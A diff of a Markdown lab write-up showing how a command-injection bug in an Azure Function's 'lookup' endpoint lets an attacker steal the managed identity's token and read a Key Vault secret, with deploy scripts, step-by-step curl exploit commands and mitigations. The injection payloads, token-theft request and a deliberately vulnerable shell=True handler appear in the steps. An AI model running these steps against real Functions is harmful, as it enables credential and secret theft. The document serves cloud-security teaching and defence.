@@ -1,32 +1,24 @@
 # Azure Function — Key Vault Secret Leak via Managed Identity Abuse
 
-Live classroom demo: a Function legitimately uses its managed identity to
-read a Key Vault secret server-side and never returns it — but a command
-injection bug elsewhere in the same Function lets an attacker steal the
-identity's own token and read the secret **directly from Key Vault**,
-completely bypassing the app's own restraint.
+A Function uses its managed identity to read a Key Vault secret server-side
+and never returns it directly — but a command-injection bug in an unrelated
+endpoint of the same Function lets an attacker steal the identity's own
+token and read the secret **directly from Key Vault**, bypassing the app's
+own logic entirely.
 
 ```
 Application Vulnerability  →  Function Compromised  →  Managed Identity  →  Key Vault Secrets User  →  Secret Value
 ```
 
-Tested end to end 2026-09-18 — this actually happened against the live
-resources below, not a hypothetical: the injected command retrieved a real
-OAuth token scoped to `vault.azure.net`, and that token was used to fetch
-`DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c` straight from Key Vault's REST
-API, with no `az login` and no Key Vault RBAC grant to the attacker at all.
-
 ## Environment
 
 | Resource | Value |
 |---|---|
-| Subscription | `QaVerify SetupCheck - Sub` (`9d8d5a47-4453-42f7-840f-648c01ed5308`) |
 | Resource group | `rg-func-kv-leak-lab` (region `westeurope`) |
-| Function App | `func-kv-leak-lab-24693` (Linux, Python 3.11, Consumption plan) |
-| Key Vault | `kv-leak-lab-15482`, RBAC authorization mode |
-| Secret | `db-password` = `DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c` (fake demo value) |
-| Managed identity | System-assigned, principal id `420d19f1-36df-4b9b-9cdd-60d32cb296af` |
-| Role granted to identity | **Key Vault Secrets User** (get/list only) scoped to this one vault — this is a *reasonable-looking*, minimal-seeming grant. The demo's point: even "least privilege" read access is a full secret leak once the app is compromised. |
+| Function App | Linux, Python 3.11, Consumption plan |
+| Key Vault | RBAC authorization mode |
+| Secret | `db-password` (a fake demo value, not a real credential) |
+| Role granted to the Function's managed identity | **Key Vault Secrets User** (get/list only), scoped to this one vault |
 
 ## The code
 
@@ -48,19 +40,18 @@ def lookup(req):
     return func.HttpResponse(result.stdout + result.stderr)
 ```
 
-`/api/db-status` is exactly what "correct" managed-identity usage looks
-like — the secret never leaves the process. `/api/lookup` is an unrelated
-"hostname lookup" diagnostics endpoint with a classic command-injection bug.
-The vulnerability doesn't need to be anywhere near the Key Vault code — any
-code-exec bug in the same Function process inherits the same identity and
-the same access.
+`/api/db-status` is the correct way to use a managed identity — the secret
+never leaves the process. `/api/lookup` is an unrelated "hostname lookup"
+endpoint with a command-injection bug. The vulnerability doesn't need to be
+anywhere near the Key Vault code — any code-exec bug in the same Function
+process inherits the same identity and the same access.
 
 ## Deploy
 
-Note: the Python packages (`azure-identity`, `azure-keyvault-secrets`) must
-be vendored into the zip — `az functionapp deployment source config-zip`
-uses a "run from package" blob path for Linux Python Consumption apps that
-does **not** run a remote pip build, even with
+The Python packages (`azure-identity`, `azure-keyvault-secrets`) must be
+vendored into the zip — `az functionapp deployment source config-zip` uses
+a "run from package" blob path for Linux Python Consumption apps that does
+**not** run a remote pip build, even with
 `SCM_DO_BUILD_DURING_DEPLOYMENT=true` set.
 
 ```bash
@@ -97,7 +88,7 @@ az functionapp config appsettings set -g $RG -n $FUNCAPP --settings \
   KEY_VAULT_URL=https://$KV.vault.azure.net/ \
   DB_SECRET_NAME=db-password
 
-# Vendor dependencies into the zip (this is the part that must not be skipped)
+# Vendor dependencies into the zip
 pip3 install --target=.python_packages/lib/site-packages \
   --platform manylinux2014_x86_64 --implementation cp --python-version 3.11 \
   --only-binary=:all: -r requirements.txt
@@ -106,22 +97,22 @@ zip -rq /tmp/kv-leak-demo.zip . -x "*.git*"
 az functionapp deployment source config-zip -g $RG -n $FUNCAPP --src /tmp/kv-leak-demo.zip
 ```
 
-## How to demo in class
+## Instructions
 
-1. Show the legit path — secret used, never exposed:
+1. Confirm the legitimate path works — the secret is used, never exposed:
 
 ```bash
 curl "https://$FUNCAPP.azurewebsites.net/api/db-status"
 # DB configured: True (secret length=40)
 ```
 
-2. Show the vulnerable endpoint working normally:
+2. Confirm the vulnerable endpoint's normal behavior:
 
 ```bash
 curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=example.com"
 ```
 
-3. Prove command injection / RCE:
+3. Exploit the command injection:
 
 ```bash
 curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=127.0.0.1;id"
@@ -129,9 +120,9 @@ curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=127.0.0.1;id"
 ```
 
 4. Steal the identity's Key Vault-scoped token through the same injection
-   point (Azure Functions/App Service exposes managed identity via the
-   `IDENTITY_ENDPOINT` / `IDENTITY_HEADER` env vars on localhost, **not**
-   the VM-style `169.254.169.254` IMDS endpoint):
+   point. Azure Functions/App Service exposes managed identity via the
+   `IDENTITY_ENDPOINT` / `IDENTITY_HEADER` environment variables on
+   localhost — **not** the VM-style `169.254.169.254` IMDS endpoint:
 
 ```bash
 curl -G "https://$FUNCAPP.azurewebsites.net/api/lookup" \
@@ -140,8 +131,8 @@ curl -G "https://$FUNCAPP.azurewebsites.net/api/lookup" \
 
 Extract `access_token` from the JSON response.
 
-5. Use the stolen token to read the secret **directly from Key Vault** —
-   the attacker never had any Key Vault role assignment of their own:
+5. Use the stolen token to read the secret directly from Key Vault — no
+   Key Vault role assignment of your own is needed:
 
 ```bash
 TOKEN="<access_token from step 4>"
@@ -155,15 +146,14 @@ Result:
 {"value":"DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c", ...}
 ```
 
-Point out: the attacker got the plaintext secret **without ever calling
-`db-status`**, without any Key Vault RBAC grant of their own, and without
-touching Azure credentials — the app's own "only return a boolean" logic
-was completely bypassed by going straight to the identity + the vault's
-REST API.
+The secret was retrieved without ever calling `db-status`, without any Key
+Vault RBAC grant of your own, and without touching Azure credentials — the
+app's own "only return a boolean" logic was bypassed entirely by going
+straight to the identity and the vault's REST API.
 
-## Mitigation talking points
+## Mitigation
 
-- **Fix the app vulnerability first** — `subprocess.run([...])` with an
+- **Fix the app vulnerability first** — use `subprocess.run([...])` with an
   argument list, never `shell=True` with unsanitized input.
 - **"Least privilege" Key Vault access is still full access to that
   secret** — `Key Vault Secrets User` sounds minimal, but if the workload
@@ -173,10 +163,9 @@ REST API.
   Function only needs one specific secret — Azure RBAC supports
   data-action conditions scoped to a secret name.
 - **Rotate secrets Functions can read, and monitor Key Vault access logs**
-  for reads that don't correlate with an actual app code path — that's the
-  detection signal for exactly this attack.
-- **Same lesson as the Kubernetes over-privileged ServiceAccount demo**: the
-  managed identity itself isn't the flaw — what it's allowed to reach is.
+  for reads that don't correlate with an actual app code path.
+- The managed identity itself isn't the flaw — what it's allowed to reach
+  is.
 
 ## Cleanup
 
